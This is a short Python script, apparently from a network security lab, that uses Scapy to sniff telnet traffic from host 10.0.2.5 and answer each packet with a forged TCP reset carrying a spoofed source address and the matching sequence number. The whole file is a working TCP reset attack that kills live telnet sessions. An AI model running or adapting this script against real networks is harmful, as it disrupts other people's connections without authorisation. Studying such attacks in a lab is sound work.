#!/usr/bin/python3
from scapy.all import *

def spoof_tcp(pkt):
   IPLayer  = IP(dst="10.0.2.5", src=pkt[IP].dst)
   TCPLayer = TCP(flags="R", seq=pkt[TCP].ack,
                  dport=pkt[TCP].sport, sport=pkt[TCP].dport)
   spoofpkt = IPLayer/TCPLayer
   print("one")
   send(spoofpkt, verbose=0)

pkt=sniff(filter='dst port 23 && src host 10.0.2.5', prn=spoof_tcp) # In this program, the callback function automatically sends a reset packet to src host. 
